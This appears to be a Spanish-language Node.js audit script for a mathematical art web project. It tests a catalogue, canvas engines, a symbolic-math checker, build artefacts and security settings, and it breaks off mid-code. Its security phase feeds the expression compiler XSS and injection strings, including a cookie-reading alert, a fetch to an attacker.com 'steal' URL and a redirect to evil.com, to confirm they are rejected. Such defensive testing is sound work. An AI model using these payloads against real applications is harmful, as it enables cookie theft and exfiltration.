/**
 * 🏛️ ATELIER MATEMÁTICO — SUITE DE INTEGRIDAD Y PRECISIÓN EN SILICIO (TIMONEL F2)
 * Nai Systems · Auditoría Determinista de Sistema Completo
 */

import fs from 'fs';
import path from 'path';
import child_process from 'child_process';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '..');

console.log('═══════════════════════════════════════════════════════════════════════');
console.log('🏛️  ATELIER MATEMÁTICO — AUDITORÍA MANIÁTICA DE PRECISIÓN EN SILICIO');
console.log('    Gobernanza: Timonel F2 · Cero Autoengaño · Silicio Nativo');
console.log('═══════════════════════════════════════════════════════════════════════\n');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ [PASS] ${message}`);
  } else {
    failedTests++;
    console.error(`  ✗ [FAIL] ${message}`);
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. AUDITORÍA DEL CATÁLOGO CANÓNICO DE 100 OBRAS
// ─────────────────────────────────────────────────────────────────────────────
console.log('📦 FASE 1: Verificación Estructural del Catálogo (artworks_catalog.js)');
const catalogPath = path.join(rootDir, 'js', 'artworks_catalog.js');
assert(fs.existsSync(catalogPath), 'Archivo artworks_catalog.js existe en disco');

let catalogModule;
try {
  catalogModule = await import(`file://${catalogPath}`);
} catch (e) {
  // CommonJS fallback for node
  const { createRequire } = await import('module');
  const require = createRequire(import.meta.url);
  catalogModule = require(catalogPath);
}

const ARTWORKS = catalogModule.ARTWORKS_100 || [];
assert(ARTWORKS.length === 100, `El catálogo contiene exactamente 100 obras canónicas (encontradas: ${ARTWORKS.length})`);

const seenIds = new Set();
const seenTitles = new Set();
let fieldDefects = 0;

ARTWORKS.forEach((art, idx) => {
  if (art.id !== idx) fieldDefects++;
  if (seenIds.has(art.id)) fieldDefects++;
  seenIds.add(art.id);

  if (seenTitles.has(art.title)) fieldDefects++;
  seenTitles.add(art.title);

  const reqFields = ['id', 'badge', 'epoch', 'year', 'author', 'title', 'sub', 'cat', 'eq', 'eqShort', 'metric', 'hist', 'poem', 'radius', 'theta', 'phi', 'archetype', 'modelKey', 'epistemology'];
  for (const f of reqFields) {
    if (art[f] === undefined || art[f] === null || art[f] === '') {
      fieldDefects++;
      console.error(`Obra ${idx} carece de campo obligatorio: ${f}`);
    }
  }
});

assert(seenIds.size === 100, 'Todos los 100 IDs son únicos y estrictamente consecutivos [0..99]');
assert(fieldDefects === 0, 'Todos los campos de metadatos históricos y matemáticos están presentes y no vacíos');

let epistemologyDefects = 0;
ARTWORKS.forEach(art => {
  if (!art.epistemology || !['A', 'B', 'C'].includes(art.epistemology.category)) epistemologyDefects++;
  if (!art.epistemology.tag || !art.epistemology.desc) epistemologyDefects++;
});
assert(epistemologyDefects === 0, '100% de las obras poseen clasificación epistemológica rigurosa (Categoría A, B o C)');

// ─────────────────────────────────────────────────────────────────────────────
// 2. AUDITORÍA DE SILICIO: ESTABILIDAD DE LOS 100 MOTORES NUMÉRICOS
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n⚙️ FASE 2: Estabilidad de Silicio de los 100 Motores Numéricos (math_engines.js)');
const enginesPath = path.join(rootDir, 'js', 'math_engines.js');
assert(fs.existsSync(enginesPath), 'Archivo math_engines.js existe en disco');

const { createRequire } = await import('module');
const require = createRequire(import.meta.url);
const { AtelierMath } = require(enginesPath);

assert(AtelierMath && AtelierMath.INITS && AtelierMath.INITS.length === 100, 'AtelierMath expone exactamente 100 funciones INITS');
assert(AtelierMath && AtelierMath.STEPS && AtelierMath.STEPS.length === 100, 'AtelierMath expone exactamente 100 funciones STEPS');

// Mock Canvas 2D Context
const mockCtx = {
  canvas: { width: 400, height: 400 },
  fillRect: () => {}, clearRect: () => {},
  beginPath: () => {}, closePath: () => {},
  moveTo: () => {}, lineTo: () => {},
  ellipse: () => {}, rect: () => {},
  bezierCurveTo: () => {}, quadraticCurveTo: () => {},
  stroke: () => {}, fill: () => {}, arc: () => {},
  strokeRect: () => {}, fillText: () => {}, measureText: () => ({ width: 10 }),
  createLinearGradient: () => ({ addColorStop: () => {} }),
  createRadialGradient: () => ({ addColorStop: () => {} }),
  getImageData: () => ({ data: new Uint8ClampedArray(400 * 400 * 4) }),
  putImageData: () => {},
  save: () => {}, restore: () => {},
  translate: () => {}, rotate: () => {}, scale: () => {},
  setLineDash: () => {},
  font: '', fillStyle: '', strokeStyle: '', lineWidth: 1, globalAlpha: 1
};
const mockCanvas = { width: 400, height: 400, getContext: () => mockCtx };

AtelierMath.bindCanvas(mockCanvas, 400, 400);

let initErrors = 0;
let stepErrors = 0;
let pointerErrors = 0;

for (let i = 0; i < 100; i++) {
  try {
    if (AtelierMath.INITS[i]) AtelierMath.INITS[i]();
  } catch (e) {
    initErrors++;
    console.error(`Fallo en init_${String(i).padStart(2, '0')}: ${e.message}`);
  }

  try {
    for (let s = 0; s < 15; s++) {
      if (AtelierMath.STEPS[i]) AtelierMath.STEPS[i]();
    }
  } catch (e) {
    stepErrors++;
    console.error(`Fallo en step_${String(i).padStart(2, '0')}: ${e.message}`);
  }

  try {
    AtelierMath.handlePointer('down', 200, 200, 0, 0, i);
    AtelierMath.handlePointer('move', 220, 180, 20, -20, i);
    if (AtelierMath.STEPS[i]) AtelierMath.STEPS[i]();
    AtelierMath.handlePointer('up', 220, 180, 0, 0, i);
  } catch (e) {
    pointerErrors++;
    console.error(`Fallo en pointer interaction para motor ${i}: ${e.message}`);
  }
}

assert(initErrors === 0, `Inicialización de 100 motores sin errores (errores: ${initErrors})`);
assert(stepErrors === 0, `Integración temporal de 15 pasos en 100 motores sin excepciones (errores: ${stepErrors})`);
assert(pointerErrors === 0, `Manipulación paramétrica por puntero en 100 motores sin errores (errores: ${pointerErrors})`);

// ── Auditoría Modular de Motores Desacoplados (js/engines/) ──
const enginesDir = path.join(rootDir, 'js', 'engines');
assert(fs.existsSync(enginesDir), 'Directorio modular js/engines/ existe en disco');

const typesPath = path.join(enginesDir, 'types.d.ts');
assert(fs.existsSync(typesPath), 'Contratos formales types.d.ts existen en disco');

const coreContextPath = path.join(enginesDir, 'core_context.js');
assert(fs.existsSync(coreContextPath), 'Módulo js/engines/core_context.js existe en disco');
const { CoreContext } = require(coreContextPath);
assert(CoreContext && typeof CoreContext.bindCanvas === 'function', 'CoreContext expone bindCanvas y gestión de canvas');
assert(CoreContext && typeof CoreContext.setPalette === 'function', 'CoreContext expone gestión cromática setPalette');

const indexPath = path.join(enginesDir, 'index.js');
assert(fs.existsSync(indexPath), 'Punto de entrada modular ES6 js/engines/index.js existe en disco');

const epochFiles = [
  { file: 'epoch1_ancient.js', epoch: 1, range: [0, 19] },
  { file: 'epoch2_classical.js', epoch: 2, range: [20, 39] },
  { file: 'epoch3_field.js', epoch: 3, range: [40, 59] },
  { file: 'epoch4_quantum.js', epoch: 4, range: [60, 79] },
  { file: 'epoch5_modern.js', epoch: 5, range: [80, 99] },
];

epochFiles.forEach(ep => {
  const epPath = path.join(enginesDir, ep.file);
  assert(fs.existsSync(epPath), `Módulo desacoplado ${ep.file} existe en disco`);
  const { epochModule } = require(epPath);
  assert(epochModule && epochModule.epoch === ep.epoch, `${ep.file} exporta epochModule con identificador ${ep.epoch}`);
  assert(epochModule.inits && epochModule.inits.length === 20, `${ep.file} encapsula exactamente 20 funciones init aisladas`);
  assert(epochModule.steps && epochModule.steps.length === 20, `${ep.file} encapsula exactamente 20 funciones step aisladas`);
  assert(epochModule.range[0] === ep.range[0] && epochModule.range[1] === ep.range[1], `${ep.file} cubre el rango canónico [${ep.range[0]}, ${ep.range[1]}]`);
});

// Verificar que las 4 salas HTML cargan los submódulos de época
const roomsWithEngines = ['index.html', 'shop.html', 'museum.html', 'studio.html'];
roomsWithEngines.forEach(room => {
  const htmlPath = path.join(rootDir, room);
  const content = fs.readFileSync(htmlPath, 'utf8');
  assert(content.includes('js/engines/core_context.js'), `Sala ${room} incluye js/engines/core_context.js`);
  assert(content.includes('js/engines/epoch1_ancient.js'), `Sala ${room} incluye js/engines/epoch1_ancient.js`);
  assert(content.includes('js/engines/epoch2_classical.js'), `Sala ${room} incluye js/engines/epoch2_classical.js`);
  assert(content.includes('js/engines/epoch3_field.js'), `Sala ${room} incluye js/engines/epoch3_field.js`);
  assert(content.includes('js/engines/epoch4_quantum.js'), `Sala ${room} incluye js/engines/epoch4_quantum.js`);
  assert(content.includes('js/engines/epoch5_modern.js'), `Sala ${room} incluye js/engines/epoch5_modern.js`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. AUDITORÍA DE GOBERNANZA: TIMONEL LINTER F2
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🛡️ FASE 3: Certificación y Auditoría de Gobernanza Timonel (timonel_linter.js)');
const linterPath = path.join(rootDir, 'js', 'timonel_linter.js');
assert(fs.existsSync(linterPath), 'Archivo timonel_linter.js existe en disco');

const { instance: Timonel } = require(linterPath);
assert(Timonel && typeof Timonel.checkEquivalence === 'function', 'TimonelLinter expone método checkEquivalence');

// Suite de 12 Identidades Clásicas de Ingeniería
const identitiesSuite = [
  ['sin(x + 2*pi)', 'sin(x)'],
  ['cos(x)^2 + sin(x)^2', '1'],
  ['2*pi*r', 'tau*r'],
  ['(x - 4)*(x + 4)', 'x^2 - 16'],
  ['(a + b)^2', 'a^2 + 2*a*b + b^2'],
  ['(a - b)^2', 'a^2 - 2*a*b + b^2'],
  ['exp(x + y)', 'exp(x)*exp(y)'],
  ['x + 5 = 12', 'x = 7'],
  ['2*x + 6 = 20', 'x = 7'],
  ['x*(x + 2) - x^2', '2*x'],
  ['x+x', '2*x']
];

let idSuccessCount = 0;
for (const [s1, s2] of identitiesSuite) {
  const res = Timonel.checkEquivalence(s1, s2);
  if (res.valid) {
    idSuccessCount++;
  } else {
    console.error(`Divergencia falsa en identidad: ${s1} <=> ${s2}`, res);
  }
}
assert(idSuccessCount === identitiesSuite.length, `Identidades compatibles en las muestras evaluadas (${idSuccessCount}/${identitiesSuite.length})`);

// Suite de 6 Falacias Matemáticas
const fallaciesSuite = [
  ['(x + 5)^2', 'x^2 + 25'],
  ['sqrt(x^2 + y^2)', 'x + y'],
  ['1/(x + y)', '1/x + 1/y'],
  ['sin(x + y)', 'sin(x) + sin(y)'],
  ['ln(x + y)', 'ln(x)*ln(y)'],
  ['x + 3 = 10', 'x = 8']
];

let falRejectedCount = 0;
for (const [s1, s2] of fallaciesSuite) {
  const res = Timonel.checkEquivalence(s1, s2);
  if (!res.valid && ['divergent', 'domain_mismatch', 'inconclusive'].includes(res.status)) {
    falRejectedCount++;
  } else {
    console.error(`Falso positivo admitido en falacia: ${s1} <=> ${s2}`, res);
  }
}
assert(falRejectedCount === fallaciesSuite.length, `Transformaciones incorrectas no aprobadas por el comprobador (${falRejectedCount}/${fallaciesSuite.length})`);

// Suite CAS: Motor de Álgebra Computacional Simbólica en Silicio (Algebrite + TimonelCAS)
const algebritePath = path.join(rootDir, 'js', 'algebrite.min.js');
assert(fs.existsSync(algebritePath), 'Motor Algebrite compilado offline existe en disco (algebrite.min.js)');

const casPath = path.join(rootDir, 'js', 'timonel_cas.js');
assert(fs.existsSync(casPath), 'Módulo timonel_cas.js existe en disco');

// Cargar Algebrite en entorno global para CAS
global.window = global;
require(algebritePath);
const { instance: TimonelCAS } = require(casPath);
assert(TimonelCAS && typeof TimonelCAS.solveStepByStep === 'function', 'TimonelCAS expone método solveStepByStep');
assert(typeof TimonelCAS.factor === 'function', 'TimonelCAS expone método factor');
assert(typeof TimonelCAS.expand === 'function', 'TimonelCAS expone método expand');
assert(typeof TimonelCAS.derivative === 'function', 'TimonelCAS expone método derivative');
assert(typeof TimonelCAS.integral === 'function', 'TimonelCAS expone método integral');
assert(typeof TimonelCAS.roots === 'function', 'TimonelCAS expone método roots');

// Verificación de operaciones analíticas reales en silicio
const solvedSteps = TimonelCAS.solveStepByStep('x^2 - 16 = 0').map(s => s.step);
assert(solvedSteps.some(s => s.includes('x_1') && s.includes('-4') && s.includes('4')), 'CAS devuelve ambas raíces de x^2 - 16 = 0');
const solvedAudit = Timonel.auditDerivation(solvedSteps);
assert(solvedAudit.slice(0, -1).every(a => a.valid) && !solvedAudit.at(-1).valid, 'Pasos algebraicos compatibles; completitud de raíces CAS queda sin demostrar por el linter');

const factoredEq = TimonelCAS.factor('x^2 - 25 = 0');
assert(factoredEq.includes('(x-5)*(x+5)'), 'TimonelCAS factoriza analíticamente x^2 - 25 = 0 a (x-5)*(x+5) = 0');

const derivedExpr = TimonelCAS.derivative('x^3 - 4*x', 'x');
assert(derivedExpr.replace(/\s+/g, '') === '3*x^2-4', 'TimonelCAS deriva analíticamente d/dx(x^3 - 4*x) = 3*x^2 - 4');

const integratedExpr = TimonelCAS.integral('3*x^2 - 4', 'x');
assert(integratedExpr.replace(/\s+/g, '') === 'x^3-4*x', 'TimonelCAS integra analíticamente ∫(3*x^2 - 4)dx = x^3 - 4*x');

const rootsFound = TimonelCAS.roots('x^2 - 9 = 0');
assert(rootsFound.includes('-3') && rootsFound.includes('3'), 'TimonelCAS halla raíces exactas {-3, 3} para x^2 - 9 = 0');

// ─────────────────────────────────────────────────────────────────────────────
// 4. AUDITORÍA DE SALAS Y RECURSOS EN EL ESPACIO DE TRABAJO
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🌐 FASE 4: Consistencia de Salas HTML y Enlaces de Navegación');
const htmlRooms = ['index.html', 'studio.html', 'museum.html', 'classroom.html', 'shop.html'];

htmlRooms.forEach(room => {
  const rPath = path.join(rootDir, room);
  assert(fs.existsSync(rPath), `Sala ${room} existe en disco`);
  const content = fs.readFileSync(rPath, 'utf8');
  assert(content.length > 5000, `Sala ${room} tiene contenido íntegro (>5 KB, actual: ${(content.length / 1024).toFixed(1)} KB)`);
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. AUDITORÍA DE CONTROLADORES MODULARES (NASA JPL ARCHITECTURE)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🚀 FASE 5: Arquitectura Modular de Controladores NASA JPL');
const controllers = [
  { file: 'classroom_controller.js', room: 'classroom.html' },
  { file: 'museum_controller.js', room: 'museum.html' },
  { file: 'studio_controller.js', room: 'studio.html' },
  { file: 'shop_controller.js', room: 'shop.html' },
  { file: 'index_controller.js', room: 'index.html' }
];

controllers.forEach(({ file, room }) => {
  const cPath = path.join(rootDir, 'js', 'controllers', file);
  assert(fs.existsSync(cPath), `Controlador modular ${file} existe en disco`);
  const cContent = fs.readFileSync(cPath, 'utf8');
  assert(cContent.length > 500, `Controlador ${file} tiene contenido sustantivo (>500 B, actual: ${cContent.length} B)`);

  const rPath = path.join(rootDir, room);
  const rContent = fs.readFileSync(rPath, 'utf8');
  assert(rContent.includes(`js/controllers/${file}`), `Sala ${room} vincula limpiamente a su controlador js/controllers/${file}`);
});

// Verificación especializada del motor 3D procedural desacoplado (museum_models.js)
const modelsPath = path.join(rootDir, 'js', 'controllers', 'museum_models.js');
assert(fs.existsSync(modelsPath), 'Motor geométrico 3D desacoplado museum_models.js existe en disco');

const modelsContent = fs.readFileSync(modelsPath, 'utf8');
assert(modelsContent.length > 50000, `museum_models.js contiene suite sustantiva de variedades 3D (>50 KB, actual: ${(modelsContent.length / 1024).toFixed(1)} KB)`);

const museumHtmlPath = path.join(rootDir, 'museum.html');
const museumHtmlContent = fs.readFileSync(museumHtmlPath, 'utf8');
const idxModels = museumHtmlContent.indexOf('js/controllers/museum_models.js');
const idxController = museumHtmlContent.indexOf('js/controllers/museum_controller.js');
assert(idxModels !== -1, 'museum.html vincula explícitamente js/controllers/museum_models.js');
assert(idxModels < idxController, 'museum.html carga museum_models.js ANTES de museum_controller.js para garantizar disponibilidad de constructores');

const MuseumModels = require(modelsPath);
assert(MuseumModels && typeof MuseumModels.BESPOKE_3D_BUILDERS === 'object', 'museum_models.js exporta catálogo BESPOKE_3D_BUILDERS');
const numBuilders = Object.keys(MuseumModels.BESPOKE_3D_BUILDERS || {}).length;
assert(numBuilders >= 37, `BESPOKE_3D_BUILDERS contiene constructores procedurales exhaustivos (encontrados: ${numBuilders} >= 37)`);

let missingModelKeys = 0;
ARTWORKS.forEach(art => {
  if (!art.modelKey || !MuseumModels.BESPOKE_3D_BUILDERS[art.modelKey]) {
    missingModelKeys++;
    console.error(`Obra ${art.id} (${art.title}) tiene modelKey sin constructor 3D: ${art.modelKey}`);
  }
});
assert(missingModelKeys === 0, `100% de las 100 obras del catálogo resuelven a un constructor 3D canónico en BESPOKE_3D_BUILDERS (defectos: ${missingModelKeys})`);

// Verificación del Recolector Determinista de Basura VRAM / WebGL (disposeThreeObject)
assert(typeof MuseumModels.disposeThreeObject === 'function', 'museum_models.js exporta función disposeThreeObject');
assert(typeof MuseumModels.disposeMaterial === 'function', 'museum_models.js exporta función disposeMaterial');

let geoDisposed = false;
let matDisposed = false;
let textureDisposed = false;
let parentRemoved = false;
const mockMesh = {
  geometry: { dispose: () => { geoDisposed = true; } },
  material: {
    map: { dispose: () => { textureDisposed = true; } },
    dispose: () => { matDisposed = true; }
  }
};
const mockParent = {
  remove: (child) => { parentRemoved = true; }
};
const mockGroup = {
  parent: mockParent,
  traverse: (cb) => { cb(mockMesh); }
};
MuseumModels.disposeThreeObject(mockGroup);
assert(geoDisposed && matDisposed && textureDisposed && parentRemoved, 'disposeThreeObject libera recursivamente BufferGeometry, Material, Texturas y desconecta del Grafo de Escena');


// ─────────────────────────────────────────────────────────────────────────────
// 6. AUDITORÍA DEL COMPILADOR SOBERANO NAILANG (NASA JPL & SILICIO NATIVO)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n⚡ FASE 6: Compilador Soberano Nailang (NASA JPL Rule 3 & Silicio Nativo)');
const candidateRtPaths = [
  path.join(rootDir, '..', 'tools', 'nailangc', 'nailang_rt.h'),
  '/Users/mati/Desktop/Nai-Workspace/tools/nailangc/nailang_rt.h'
];
const nailangRtPath = candidateRtPaths.find(p => fs.existsSync(p)) || candidateRtPaths[0];
assert(fs.existsSync(nailangRtPath), 'Header de runtime nailang_rt.h existe en disco');
const rtContent = fs.readFileSync(nailangRtPath, 'utf8');
assert(rtContent.includes('NaiArena') && rtContent.includes('nai_arena_init') && rtContent.includes('nai_arena_alloc'),
  'nailang_rt.h implementa NaiArena conforme a Regla 3 NASA JPL (Cero fragmentación post-init)');

const candidateNailangc = [
  path.join(rootDir, '..', 'tools', 'nailangc', 'nailangc'),
  '/Users/mati/Desktop/Nai-Workspace/tools/nailangc/nailangc'
];
const nailangcPath = candidateNailangc.find(p => fs.existsSync(p)) || candidateNailangc[0];
assert(fs.existsSync(nailangcPath), 'Binario de producción nailangc compilado existe en silicio');

// Prueba de compilación AST canónica
const candidateMatrixNai = [
  path.join(rootDir, '..', 'core', 'nailang', 'matrix3x3_r21.nai'),
  '/Users/mati/Desktop/Nai-Workspace/core/nailang/matrix3x3_r21.nai'
];
const matrixNai = candidateMatrixNai.find(p => fs.existsSync(p)) || candidateMatrixNai[0];
const resMatrix = child_process.spawnSync(nailangcPath, ['--ast', matrixNai], { encoding: 'utf8' });
assert(resMatrix.status === 0, `nailangc compila exitosamente AST de kernel canónico matrix3x3_r21.nai`);

const candidateTypesNai = [
  path.join(rootDir, '..', 'projects', 'nai-open', 'core', 'types.nai'),
  '/Users/mati/Desktop/Nai-Workspace/projects/nai-open/core/types.nai'
];
const typesNai = candidateTypesNai.find(p => fs.existsSync(p)) || candidateTypesNai[0];
const resTypes = child_process.spawnSync(nailangcPath, ['--ast', typesNai], { encoding: 'utf8' });
assert(resTypes.status === 0, `nailangc compila exitosamente AST de contratos modulares types.nai (13 contratos)`);

const resEmit = child_process.spawnSync(nailangcPath, ['--emit-only', matrixNai], { encoding: 'utf8' });
assert(resEmit.status === 0, `nailangc genera código C puro de alta fidelidad sin desbordes de pila`);


// ─────────────────────────────────────────────────────────────────────────────
// 7. AUDITORÍA DE CONVERSIÓN DESKTOP Y FICHA FINE ART
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🖥️ FASE 7: Conversión Workstation Desktop & Certificados Fine Art');
const desktopModalPath = path.join(rootDir, 'js', 'controllers', 'desktop_modal.js');
assert(fs.existsSync(desktopModalPath), 'Módulo desktop_modal.js existe en disco');

const desktopModal = require(desktopModalPath);
assert(typeof desktopModal.openDesktopModal === 'function', 'desktop_modal.js expone función openDesktopModal');
assert(typeof desktopModal.switchOSBuild === 'function', 'desktop_modal.js expone función switchOSBuild');
assert(desktopModal.OS_BUILDS && desktopModal.OS_BUILDS['macos-arm'], 'desktop_modal.js define paquetes nativos Apple Silicon');
assert(desktopModal.OS_BUILDS['linux'] && desktopModal.OS_BUILDS['windows'], 'desktop_modal.js define paquetes multiplataforma Linux y Windows');

// Verificar que las 5 salas HTML contienen el botón e importan desktop_modal.js
htmlRooms.forEach(room => {
  const rPath = path.join(rootDir, room);
  const content = fs.readFileSync(rPath, 'utf8');
  assert(content.includes('desktop_modal.js'), `Sala ${room} incluye script desktop_modal.js`);
  assert(content.includes('openDesktopModal'), `Sala ${room} contiene llamada interactiva a openDesktopModal`);
});

// Verificar artefactos del Core Desktop Nativo (Apple Silicon & DMG)
const candidateDesktop = [
  path.join(rootDir, 'desktop'),
  path.join(rootDir, '..', 'desktop'),
  '/Users/mati/Desktop/Nai-Workspace/desktop'
];
const desktopDir = candidateDesktop.find(p => fs.existsSync(p)) || candidateDesktop[0];
assert(fs.existsSync(path.join(desktopDir, 'main.swift')), 'Código fuente nativo desktop/main.swift existe en disco');
assert(fs.existsSync(path.join(desktopDir, 'Info.plist')), 'Metadatos desktop/Info.plist existen en disco');
assert(fs.existsSync(path.join(desktopDir, 'bridge.js')), 'Puente nativo desktop/bridge.js existe en disco');

const candidateScripts = [
  path.join(rootDir, 'scripts', 'build_desktop_app.sh'),
  path.join(rootDir, '..', 'scripts', 'build_desktop_app.sh'),
  '/Users/mati/Desktop/Nai-Workspace/scripts/build_desktop_app.sh'
];
const buildDesktopScript = candidateScripts.find(p => fs.existsSync(p)) || candidateScripts[0];
assert(fs.existsSync(buildDesktopScript), 'Pipeline scripts/build_desktop_app.sh existe en disco');

const candidateAppBundle = [
  path.join(rootDir, 'build', 'desktop', 'Atelier Matematico.app'),
  path.join(rootDir, '..', 'build', 'desktop', 'Atelier Matematico.app'),
  '/Users/mati/Desktop/Nai-Workspace/build/desktop/Atelier Matematico.app'
];
const appBundlePath = candidateAppBundle.find(p => fs.existsSync(p)) || candidateAppBundle[0];
assert(fs.existsSync(appBundlePath), 'Bundle nativo Atelier Matematico.app construido en silicio');

const candidateDmg = [
  path.join(rootDir, 'downloads', 'Atelier_Matematico_Silicon_arm64.dmg'),
  path.join(rootDir, 'gallery', 'downloads', 'Atelier_Matematico_Silicon_arm64.dmg'),
  '/Users/mati/Desktop/Nai-Workspace/gallery/downloads/Atelier_Matematico_Silicon_arm64.dmg'
];
const dmgPath = candidateDmg.find(p => fs.existsSync(p)) || candidateDmg[0];
assert(fs.existsSync(dmgPath), 'Instalador DMG Atelier_Matematico_Silicon_arm64.dmg disponible en descargas web');
const dmgStats = fs.statSync(dmgPath);
assert(dmgStats.size > 1000000, `Tamaño de DMG íntegro (>1 MB, actual: ${(dmgStats.size / 1024 / 1024).toFixed(2)} MB)`);

// Verificar capacidades de Fine Art Shop: Monedas internacionales y Certificado Criptográfico
const shopControllerPath = path.join(rootDir, 'js', 'controllers', 'shop_controller.js');
const shopContent = fs.readFileSync(shopControllerPath, 'utf8');
assert(shopContent.includes('setCurrency') && shopContent.includes('PRICES'), 'shop_controller.js implementa cotización multi-divisa (CLP, USD, EUR)');
assert(shopContent.includes('downloadCertificate'), 'shop_controller.js implementa generación determinista de Certificado de Autenticidad');
assert(shopContent.includes('Hahnemühle Photo Rag 308') && shopContent.includes('UltraChrome Pro12'), 'shop_controller.js certifica sustratos de grado museo (Hahnemühle 308g & UltraChrome Pro12)');

// ─────────────────────────────────────────────────────────────────────────────
// 8. AUDITORÍA DE CIBERSEGURIDAD DETERMINISTA (TIMONEL F2 PREFRONTAL)
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n🛡️ FASE 8: Ciberseguridad Determinista (Anti-XSS, SHA-256 Real & App Sandbox)');

// 1. Verificación de Inmunidad XSS/RCE en JITMathCompiler
const jitPath = path.join(rootDir, 'js', 'jit_compiler.js');
assert(fs.existsSync(jitPath), 'Módulo jit_compiler.js existe en disco');
const jitCode = fs.readFileSync(jitPath, 'utf8');
assert(!jitCode.includes('new Function') && !jitCode.includes('eval('), 'jit_compiler.js erradica totalmente new Function y eval (Cero riesgo de RCE/XSS)');

const { instance: jitEngine } = require(jitPath);
assert(jitEngine && typeof jitEngine.compile === 'function', 'JITMathCompiler expone método compile');

// Evaluación legítima de campos matemáticos
const testFn1 = jitEngine.compile('-y', ['x', 'y', 't']);
assert(testFn1(1, 4, 0) === -4, 'JITMathCompiler compila y evalúa con precisión campo lineal -y');

const testFn2 = jitEngine.compile('2*x*y + cos(t)', ['x', 'y', 't']);
assert(Math.abs(testFn2(2, 3, 0) - 13) < 1e-9, 'JITMathCompiler compila y evalúa combinaciones trigonométricas no lineales');

// Resistencia a vectores maliciosos de inyección de código
const malAttack1 = jitEngine.compile('1); alert(document.cookie); (', ['x', 'y', 't']);
assert(malAttack1(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz inyección XSS con alert() devolviendo fallback seguro 0');

const malAttack2 = jitEngine.compile('fetch("https://attacker.com/steal")', ['x', 'y', 't']);
assert(malAttack2(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz inyección XSS con fetch() devolviendo fallback seguro 0');

const malAttack3 = jitEngine.compile('window.location="http://evil.com"', ['x', 'y', 't']);
assert(malAttack3(1, 1, 1) === 0, 'JITMathCompiler rechaza de raíz acceso a identificadores no autorizados');

// 2. Verificación de Huella Criptográfica Auténtica SHA-256 en Certificados
const updatedShopContent = fs.readFileSync(shopControllerPath, 'utf8');
assert(!updatedShopContent.includes('Math.random()*16'), 'shop_controller.js erradica hashes falsos generados con Math.random()');
assert(updatedShopContent.includes('SHA-256') && (updatedShopContent.includes('subtle.digest') || updatedShopContent.includes('crypto.createHash')), 'shop_controller.js implementa cálculo real y auditable de hash criptográfico SHA-256');
assert(updatedShopContent.includes('ATELIER_CONCIERGE_PHONE') && !updatedShopContent.includes('56900000000'), 'shop_controller.js define línea real de concierge sin teléfonos placeholder');

// 3. Verificación de Protección Path Traversal y ATS en el Runner Nativo macOS
const mainSwiftPath = path.join(desktopDir, 'main.swift');
const mainSwiftContent = fs.readFileSync(mainSwiftPath, 'utf8');
assert(mainSwiftContent.includes('lastPathComponent'), 'desktop/main.swift sanitiza nombres de archivo con lastPathComponent contra Path Traversal');

const infoPlistPath = path.join(desktopDir, 'Info.plist');
const infoPlistContent = fs.readFileSync(infoPlistPath, 'utf8');
assert(!infoPlistContent.includes('NSAllowsArbitraryLoads'), 'desktop/Info.plist prohíbe conexiones HTTP en texto plano (ATS estricto activo)');

// 4. Verificación de Controles Táctiles Móviles en Observatorio 3D & SRI en Recursos Externos
const updatedMuseumContent = fs.readFileSync(path.join(rootDir, 'museum.html'), 'utf8');
assert(updatedMuseumContent.includes('id="mobile-touch-controls"') && updatedMuseumContent.includes('btn-touch-action'), 'museum.html provee D-Pad táctil virtual y control de propulsión 6DOF para dispositivos móviles');

const updatedClassroomContent = fs.readFileSync(path.join(rootDir, 'classroom.html'), 'utf8');
assert(updatedClassroomContent.includes('integrity="sha384-') && updatedClassroomContent.includes('crossorigin="anonymous"'), 'classroom.html protege KaTeX con firmas de integridad de subrecurso (SRI)');

const roomSyncPath = path.join(rootDir, 'js', 'room_sync.js');
const roomSyncContent = fs.readFileSync(roomSyncPath, 'utf8');
assert(roomSyncContent.includes('BroadcastChannel') && roomSyncContent.includes('Demarcación determinista de alcance local'), 'room_sync.js declara honestamente su arquitectura de sincronización local BroadcastChannel');

// 5. Verificación de Content Security Policy (CSP) en las 5 salas canónicas
const cspRooms = ['index.html', 'shop.html', 'museum.html', 'classroom.html', 'studio.html'];
cspRooms.forEach(room => {
  const content = fs.readFileSync(path.join(rootDir, room), 'utf8');
  assert(content.includes('http-equiv="Content-Security-Policy"'), `Sala ${room} define política estricta de seguridad de contenido (CSP)`);
});

// 6. Inmunidad XSS en el Graficador Cartesiano (ClassroomController) & Paquete Offline Completo
const classroomCtrlCode = fs.readFileSync(path.join(rootDir, 'js', 'controllers', 'classroom_controller.js'), 'utf8');
assert(!classroomCtrlCode.includes('new Function'), 'classroom_controller.js erradica totalmente new Function (Cero riesgo de RCE/XSS)');
assert(classroomCtrlCode.includes('JITMathCompiler.compile'), 'classroom_controller.js delega evaluación simbólica en el motor seguro JITMathCompiler');

const tailwindPath = path.join(rootDir, 'js', 'tailwindcss.min.js');
assert(fs.existsSync(tailwindPath) && fs.statSync(tailwindPath).size > 300000, 'Motor CSS tailwindcss.min.js empaquetado localmente para ejecución 100% offline');

cspRooms.forEach(room => {
  const content = fs.readFileSync(path.join(rootDir, room), 'utf8');
  assert(content.includes('src="js/tailwindcss.min.js"'), `Sala ${room} vincula tailwindcss localmente sin depender de CDN externo`);
});

// 7. Verificación de Integridad de Enlaces y Conexiones DOM (Onclicks & Cross-Links)
const roomControllers = {
  'index.html': ['js/controllers/index_controller.js', 'js/controllers/desktop_modal.js'],
  'shop.html': ['js/controllers/shop_controller.js', 'js/controllers/desktop_modal.js'],
  'studio.html': ['js/controllers/studio_controller.js', 'js/controllers/desktop_modal.js'],
  'museum.html': ['js/controllers/museum_controller.js', 'js/controllers/museum_models.js', 'js/controllers/desktop_modal.js'],
